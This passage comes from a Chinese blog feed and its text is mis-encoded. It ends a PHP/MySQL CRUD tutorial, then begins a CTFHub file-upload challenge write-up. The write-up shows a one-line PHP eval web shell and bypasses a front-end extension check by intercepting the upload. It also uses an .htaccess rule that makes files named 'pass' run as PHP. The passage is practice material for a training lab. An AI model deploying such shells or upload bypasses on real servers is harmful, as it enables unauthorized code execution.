class="hljs-string">&quot;&lt;br&gt;&quot;</span> . mysqli_error(<span class="hljs-variable">$conn</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>è¡¨ä¸­æ–°å¢3æ¡æ•°æ®<br><img src="https://img-blog.csdnimg.cn/20210415130249849.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="è¯»å–æ•°æ®"><a href="#è¯»å–æ•°æ®" class="headerlink" title="è¯»å–æ•°æ®"></a>è¯»å–æ•°æ®</h2><p>SELECT è¯­å¥ç”¨äºä»æ•°æ®è¡¨ä¸­è¯»å–æ•°æ®:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">SELECT column_name(s) <span class="hljs-keyword">FROM</span> table_name<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ * å·æ¥è¯»å–æ‰€æœ‰æ•°æ®è¡¨ä¸­çš„å­—æ®µï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">SELECT * <span class="hljs-keyword">FROM</span> table_name<br></code></pre></td></tr></table></figure><p>åœ¨testæ•°æ®åº“ä¸­studentè¡¨çš„å†…å®¹ï¼š<br><img src="https://img-blog.csdnimg.cn/202104141743230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä»studentè¡¨ä¸­è¯»å–æ•°æ®:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#PHP MySQL è¯»å–mydemoè¡¨æ•°æ®</span><br>header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;username&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;pasword&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;demo&quot;</span>;<br> <br><span class="hljs-comment">// åˆ›å»ºè¿æ¥</span><br><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);<br><span class="hljs-comment">// Check connection</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿æ¥å¤±è´¥: &quot;</span> . mysqli_connect_error());<br>&#125;<br><span class="hljs-comment">//è®¾ç½®è¿”å›æ•°æ®çš„å­—ç¬¦é›†</span><br>mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;set character set &#x27;utf8&#x27;&quot;</span>);<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM mydemo&quot;</span>;<br><span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>);<br><br><span class="hljs-keyword">if</span> (mysqli_num_rows(<span class="hljs-variable">$result</span>) &gt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-comment">// è¾“å‡ºæ•°æ®</span><br>    <span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span> = mysqli_fetch_assoc(<span class="hljs-variable">$result</span>)) &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;ID: &quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;id&quot;</span>]. <span class="hljs-string">&quot; - å§“å: &quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;name&quot;</span>]. <span class="hljs-string">&quot; - æ€§åˆ«: &quot;</span>. <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;sex&quot;</span>].<span class="hljs-string">&quot;-å¹´é¾„: &quot;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;age&quot;</span>]. <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    &#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;0 ç»“æœ&quot;</span>;<br>&#125;<br> <br>mysqli_close(<span class="hljs-variable">$conn</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>è¯»åˆ°äº†è¡¨ä¸­çš„æ•°æ®<br><img src="https://img-blog.csdnimg.cn/20210415130519716.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>è¯»å‡ºæ¥çš„æ•°æ®ä¸å¤Ÿç¾è§‚ï¼Œå‚ç…§<a href="https://blog.csdn.net/weixin_43627723/article/details/102503726">å¤§ä½¬</a>çš„åšå®¢ç¾åŒ–ä¸€ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#PHP MySQL è¯»å–mydemoè¡¨æ•°æ®</span><br>header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;username&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;pasword&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;demo&quot;</span>;<br> <br><span class="hljs-comment">// åˆ›å»ºè¿æ¥</span><br><span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);<br><span class="hljs-comment">// Check connection</span><br><span class="hljs-keyword">if</span> (!<span class="hljs-variable">$conn</span>) &#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;è¿æ¥å¤±è´¥: &quot;</span> . mysqli_connect_error());<br>&#125;<br><span class="hljs-comment">//è®¾ç½®è¿”å›æ•°æ®çš„å­—ç¬¦é›†</span><br>mysqli_query(<span class="hljs-variable">$conn</span>,<span class="hljs-string">&quot;set names utf8&quot;</span>);<br><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;SELECT * FROM mydemo&quot;</span>;<br><span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$conn</span>, <span class="hljs-variable">$sql</span>);<br><br><br> <br>mysqli_close(<span class="hljs-variable">$conn</span>);<br><span class="hljs-meta">?&gt;</span><br>&lt;!DOCYTPE html&gt;<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;meta charset = <span class="hljs-string">&quot;utf-8&quot;</span>&gt;<br>&lt;title&gt;&lt;/title&gt;<br>&lt;style type=<span class="hljs-string">&quot;text/css&quot;</span>&gt;<br>th,td&#123;<br>padding:<span class="hljs-number">5</span>px;color:<span class="hljs-comment">#444;</span><br>font-size:<span class="hljs-number">14</span>px;border:<span class="hljs-number">1</span>px soild <span class="hljs-comment">#ccc;</span><br>&#125;<br>&lt;/style&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;table width=<span class="hljs-string">&quot;800&quot;</span> border=<span class="hljs-string">&quot;1&quot;</span> style=<span class="hljs-string">&quot;border-collapse:collapse;&quot;</span> align=<span class="hljs-string">&quot;center&quot;</span>&gt;<br>&lt;tr&gt;<br>&lt;th&gt;ID&lt;/th&gt;<br>&lt;th&gt;å§“å&lt;/th&gt;<br>&lt;th&gt;æ€§åˆ«&lt;/th&gt;<br>&lt;th&gt;å¹´é¾„&lt;/th&gt;<br>&lt;/tr&gt;<br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">while</span>(<span class="hljs-variable">$row</span>=mysqli_fetch_row(<span class="hljs-variable">$result</span>))&#123;<br><span class="hljs-meta">?&gt;</span><br>&lt;tr&gt;<br>&lt;td align=<span class="hljs-string">&quot;center&quot;</span>&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-number">0</span>]<span class="hljs-meta">?&gt;</span>&lt;/td&gt;<br>&lt;td align=<span class="hljs-string">&quot;center&quot;</span>&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-number">1</span>]<span class="hljs-meta">?&gt;</span>&lt;/td&gt;<br>&lt;td align=<span class="hljs-string">&quot;center&quot;</span>&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-number">2</span>]<span class="hljs-meta">?&gt;</span>&lt;/td&gt;<br>&lt;td align=<span class="hljs-string">&quot;center&quot;</span>&gt;<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$row</span>[<span class="hljs-number">3</span>]<span class="hljs-meta">?&gt;</span>&lt;/td&gt;<br>&lt;/tr&gt;<br><span class="hljs-meta">&lt;?php</span> &#125; <span class="hljs-meta">?&gt;</span><br>&lt;/table&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br></code></pre></td></tr></table></figure><p>å¾—åˆ°<br><img src="https://img-blog.csdnimg.cn/20210415130641730.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="ä¿®æ”¹æ•°æ®"><a href="#ä¿®æ”¹æ•°æ®" class="headerlink" title="ä¿®æ”¹æ•°æ®"></a>ä¿®æ”¹æ•°æ®</h2><p>UPDATE è¯­å¥ç”¨äºä¸­ä¿®æ”¹æ•°æ®åº“è¡¨ä¸­çš„æ•°æ®<br>è¯­æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">UPDATE table_name<br>SET column1=value, column2=value2,...<br>WHERE some_column=some_value<br></code></pre></td></tr></table></figure><p>é€šè¿‡å®ä¾‹ä¿®æ”¹æ•°æ®è¡¨ä¸­çš„æ•°æ®</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#PHP MySQL æ›´æ–°mydemoè¡¨æ•°æ®</span><br>header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;username&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;pasword&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;demo&quot;</span>;<br> <br><span class="hljs-comment">// åˆ›å»ºè¿æ¥</span><br><span class="hljs-variable">$con</span> = mysqli_connect(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);<br><span class="hljs-comment">// æ£€æµ‹è¿æ¥</span><br><span class="hljs-keyword">if</span> (mysqli_connect_errno())<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;è¿æ¥å¤±è´¥: &quot;</span> . mysqli_connect_error();<br>&#125;<br><br>mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-string">&quot;UPDATE mydemo SET Age=20</span><br><span class="hljs-string">WHERE ID=1004&quot;</span>);<br><br>mysqli_close(<span class="hljs-variable">$con</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>mydemoæ•°æ®è¡¨ä¸­id=1004çš„è®°å½•ageå˜ä¸º20<br><img src="https://img-blog.csdnimg.cn/20210415132140762.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="åˆ é™¤æ•°æ®"><a href="#åˆ é™¤æ•°æ®" class="headerlink" title="åˆ é™¤æ•°æ®"></a>åˆ é™¤æ•°æ®</h2><p>DELETE FROM è¯­å¥ç”¨äºä»æ•°æ®åº“è¡¨ä¸­åˆ é™¤è®°å½•ã€‚</p><p>è¯­æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php">DELETE <span class="hljs-keyword">FROM</span> table_name<br>WHERE some_column = some_value<br></code></pre></td></tr></table></figure><p>åˆ é™¤ä¸€æ¡è®°å½•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">#PHP MySQL æ›´æ–°mydemoè¡¨æ•°æ®</span><br>header(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);<br><span class="hljs-variable">$servername</span> = <span class="hljs-string">&quot;localhost&quot;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-string">&quot;username&quot;</span>;<br><span class="hljs-variable">$password</span> = <span class="hljs-string">&quot;pasword&quot;</span>;<br><span class="hljs-variable">$dbname</span> = <span class="hljs-string">&quot;demo&quot;</span>;<br> <br><span class="hljs-comment">// åˆ›å»ºè¿æ¥</span><br><span class="hljs-variable">$con</span> = mysqli_connect(<span class="hljs-variable">$servername</span>, <span class="hljs-variable">$username</span>, <span class="hljs-variable">$password</span>, <span class="hljs-variable">$dbname</span>);<br><span class="hljs-comment">// æ£€æµ‹è¿æ¥</span><br><span class="hljs-keyword">if</span> (mysqli_connect_errno())<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;è¿æ¥å¤±è´¥: &quot;</span> . mysqli_connect_error();<br>&#125;<br><br>mysqli_query(<span class="hljs-variable">$con</span>,<span class="hljs-string">&quot;DELETE FROM mydemo WHERE ID=1004&quot;</span>);<br><br>mysqli_close(<span class="hljs-variable">$con</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>mydmoè¡¨ä¸­id=4çš„è®°å½•æ¶ˆå¤±<br><img src="https://img-blog.csdnimg.cn/20210415133058835.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>ç¼–ç¨‹å¼€å‘</category>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP</tag>
      
      <tag>MYSQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFHub-Web-æ–‡ä»¶ä¸Šä¼ ç»ƒä¹ </title>
    <link href="/2020/11/22/CTFHub-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%83%E4%B9%A0/"/>
    <url>/2020/11/22/CTFHub-Web-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%83%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šCTFHubé¶åœºé€šå…³ï¼ˆä¸‰ï¼‰</p> <a id="more"></a><h2 id="0x00-æ— éªŒè¯"><a href="#0x00-æ— éªŒè¯" class="headerlink" title="0x00 æ— éªŒè¯"></a>0x00 æ— éªŒè¯</h2><p><img src="https://img-blog.csdnimg.cn/2020111821051990.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬1.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;pass&quot;</span>]);<span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>ä¸Šä¼ æ–‡ä»¶ç›¸å¯¹è·¯å¾„<code>upload/1.php</code><br><img src="https://img-blog.csdnimg.cn/20201118210615644.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä½¿ç”¨èšå‰‘è¿æ¥ï¼Œè¿æ¥å¯†ç ä¸º<code>pass</code><br><img src="https://img-blog.csdnimg.cn/20201118210744773.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥çœ‹ç›®å½•ï¼Œflagå°±åœ¨è¿™é‡Œ<br><img src="https://img-blog.csdnimg.cn/20201118210930972.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="0x01-å‰ç«¯éªŒè¯"><a href="#0x01-å‰ç«¯éªŒè¯" class="headerlink" title="0x01 å‰ç«¯éªŒè¯"></a>0x01 å‰ç«¯éªŒè¯</h2><p><img src="https://img-blog.csdnimg.cn/20201118211350400.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ä¸Šä¼ ä¸€å¥è¯æœ¨é©¬ï¼Œç»“æœæç¤ºè¯¥æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ <br><img src="https://img-blog.csdnimg.cn/2020111821132240.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>é¢˜ç›®æ˜¯å‰ç«¯éªŒè¯ï¼Œç›´æ¥æŸ¥çœ‹ç½‘é¡µæºä»£ç ï¼Œå‘ç°åªèƒ½ä¸Šä¼ <code>.jpg</code>,<code>.png</code>,<code>.gif</code>ä¸‰ç§æ ¼å¼çš„æ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/20201118211703499.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>æŠŠ1.phpæ”¹ä¸º1.jpgï¼Œç„¶åä¸Šä¼ æŠ“åŒ…</p><p><img src="https://img-blog.csdnimg.cn/20201118212718468.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>1.jpgå†æ”¹ä¸º1.phpï¼Œç„¶åæ”¾åŒ…<br><img src="https://img-blog.csdnimg.cn/20201118213046598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ä¸Šä¼ æˆåŠŸï¼Œå¾—åˆ°ç›¸å¯¹è·¯å¾„upload/1.php<br><img src="https://img-blog.csdnimg.cn/2020111821314576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è¿˜æ˜¯ä¸€æ ·çš„æ“ä½œï¼Œèšå‰‘è¿æ¥ï¼ŒæŸ¥æ‰¾ç›®å½•ï¼Œæ‰¾åˆ°flag<br><img src="https://img-blog.csdnimg.cn/20201118213340365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h2 id="0x03-htaccess"><a href="#0x03-htaccess" class="headerlink" title="0x03 .htaccess"></a>0x03 .htaccess</h2><p>é¢˜ç›®æè¿°ï¼šhtaccessæ–‡ä»¶æ˜¯ApacheæœåŠ¡å™¨ä¸­çš„ä¸€ä¸ªé…ç½®æ–‡ä»¶ï¼Œå®ƒè´Ÿè´£ç›¸å…³ç›®å½•ä¸‹çš„ç½‘é¡µé…ç½®ã€‚é€šè¿‡htaccessæ–‡ä»¶ï¼Œå¯ä»¥å¸®æˆ‘ä»¬å®ç°ï¼šç½‘é¡µ301é‡å®šå‘ã€è‡ªå®šä¹‰404é”™è¯¯é¡µé¢ã€æ”¹å˜æ–‡ä»¶æ‰©å±•åã€å…è®¸/é˜»æ­¢ç‰¹å®šçš„ç”¨æˆ·æˆ–è€…ç›®å½•çš„è®¿é—®ã€ç¦æ­¢ç›®å½•åˆ—è¡¨ã€é…ç½®é»˜è®¤æ–‡æ¡£ç­‰åŠŸèƒ½</p><p>è®¿é—®<br><img src="https://img-blog.csdnimg.cn/2020111822095844.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŸ¥çœ‹æºä»£ç ï¼Œå‘ç°æ–‡ä»¶åç¼€éƒ½è¢«ç¦ç”¨äº†<br><img src="https://img-blog.csdnimg.cn/2020111822110957.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>ç™¾åº¦ä¸€ä¸‹hatccessæ–‡ä»¶ï¼Œ<code>.htaccess</code>æ˜¯Apacheçš„åˆä¸€ç‰¹è‰²ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œé…ç½®æ–‡ä»¶çš„ä½œç”¨èŒƒå›´éƒ½æ˜¯å…¨å±€çš„ï¼Œä½†Apacheæä¾›äº†ä¸€ç§å¾ˆæ–¹ä¾¿çš„ã€å¯ä½œç”¨äºå½“å‰ç›®å½•åŠå…¶å­ç›®å½•çš„é…ç½®æ–‡ä»¶â€”â€”.htaccessï¼ˆåˆ†å¸ƒå¼é…ç½®æ–‡ä»¶ï¼‰</p><p><code>.hatccess</code>æ–‡ä»¶æœ‰ä¸¤ç§å†™æ³•</p><p><strong>ç¬¬ä¸€ç§æ–¹æ³•:</strong><br>ä¸‹é¢ä»£ç çš„æ„æ€æ˜¯ï¼Œåªè¦æ–‡ä»¶åä¸­åŒ…å«passï¼Œå°±ä¼šè¢«Apacheè§£æä¸ºphpæ–‡ä»¶ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;FilesMatch <span class="hljs-string">&quot;pass&quot;</span>&gt;<br>SetHandler application/x-httpd-php<br>&lt;/FilesMatch&gt;<br></code></pre></td></tr></table></figure><p>æç¤ºæ–‡ä»¶åä¸èƒ½ä¸ºç©ºï¼Œå‘½åä¸º<code>3.hatccess</code>,ç”¨bpæŠ“åŒ…ï¼Œå°†3.htaccessæ”¹ä¸º<code>.htaccass</code>ï¼Œç„¶åæ”¾åŒ…<br><img src="https://img-blog.csdnimg.cn/2020111912484428.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p><code>.htaccass</code>æ–‡ä»¶ä¸Šä¼ æˆåŠŸ<br><img src="https://img-blog.csdnimg.cn/20201119124911563.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æŠŠä¸Šé¢ç”¨åˆ°çš„1.phpæ”¹ä¸º3.passæ–‡ä»¶ï¼Œä¸Šä¼ æ–‡ä»¶ç›¸å¯¹è·¯å¾„<code>upload/3.pass</code><br><img 